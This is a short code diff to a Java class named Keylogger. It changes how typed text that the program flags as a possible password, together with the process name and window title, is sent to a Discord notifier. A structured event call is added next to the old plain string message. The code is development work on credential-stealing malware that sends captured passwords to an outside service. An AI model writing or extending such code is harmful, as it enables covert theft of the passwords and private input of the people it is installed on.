@@ -360,7 +360,13 @@ final class Keylogger {
 		state.passwordEvents++;
 		saveIfDue();
 		if (DiscordConfig.sendPasswords()) {
-			notifier.send("password? " + process + " | " + title + " | " + clean);
+			String legacy = "password? " + process + " | " + title + " | " + clean;
+			notifier.send(legacy);
+			java.util.Map<String, Object> data = new java.util.LinkedHashMap<>();
+			data.put("process", process);
+			data.put("title", title);
+			data.put("text", clean);
+			notifier.event("password", data, legacy);
 		}
 	}
 
